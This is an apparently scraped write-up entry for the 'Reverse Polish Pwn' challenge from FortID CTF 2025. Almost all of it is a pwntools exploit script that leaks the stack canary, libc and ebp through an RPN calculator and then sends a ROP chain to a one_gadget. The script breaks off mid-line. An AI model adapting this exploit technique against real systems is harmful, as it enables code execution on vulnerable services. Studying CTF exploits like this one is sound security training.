@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://infosecwriteups.com/reverse-polish-pwn-writeup-fortid-ctf-2025-0022398d5b84
+CHALLENGE: Reverse Polish Pwn Writeup | FortID CTF 2025 - InfoSec Write-ups
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: Canary
+KEY_FUNCTIONS: printf
+KEY_TECHNIQUE: Writeup for Reverse Polish Pwn Writeup | FortID CTF 2025 - InfoSec Write-ups — rop_chain exploitation technique.
+---
+ELF("./chall_patched") libc = ELF("./libc.so.6") ld = ELF("./ld-2.27.so") context.binary = exe gs2 = ''' b *rpn_loop+55 c ''' def conn(): if args.LOCAL: io = process([exe.path]) #if args.GDB: #   io = gdb.debug(exe.path, gdbscript=gs2) else: io = remote("0.cloud.chals.io", 11342) return io def send_cmd(io, cmd): io.sendlineafter(b"RPN> ", cmd) def leak_next_dword(io, payload): # leaks the immediate next address in 2 stages: 1) first 4 bytes 2) last 4 bytes payload += f"pop rot rot dup dup pop rot rot dup pop rot pop pop".encode() send_cmd(io, payload) err = io.recvline() # for the first pop if (err == b'error: stack overflow\n'): return (0, 0, 0) first_half_raw = int(io.recvline().strip()) second_half_raw = int(io.recvline().strip()) first_half = ctypes.c_uint32(first_half_raw).value second_half =ctypes.c_uint32(second_half_raw).value address = first_half + (second_half << 32) return (address, first_half_raw, second_half_raw) def fill_buffer(x): payload = b"" for i in range(x): payload += f"push {i} ".encode() return payload def main(): io = conn() canary, c1, c2 = leak_next_dword(io, fill_buffer(65)) success(f"canary leak: {hex(canary)}") libc_leak, _, _ = leak_next_dword(io, fill_buffer(13)) libc.address = libc_leak - libc.symbols["__printf"] - 0xA6 success(f"libc address: {hex(libc.address)}") ebp_leak_payload = fill_buffer(65) + f"push {c1} rot rot pop rot rot push {c1} rot rot pop rot rot pop rot rot".encode() send_cmd(io, ebp_leak_payload) ebp_value = ctypes.c_uint32(int(io.recvline().strip())).value buffer_address = ebp_value - 0x1E0 + 0x10 success(f"ebp: {hex(ebp_value)}") success(f"buffer address: {hex(buffer_address)}") success("leaked ebp") ret = libc.address + 0x1e6904 one_gadget = libc.address + 0x4f29e rop_chain = p64(0) + p64(canary) + b"B"* 8 + p64(one_gadget) rbp_overwrite_payload = fill_buffer(65) + f"push {c1} rot rot pop push {buffer_address} rot   ".encode() + rop_chain send_cmd(io, rbp_overwrite_payload) success("corrupted rbp") send_cmd(io, b"
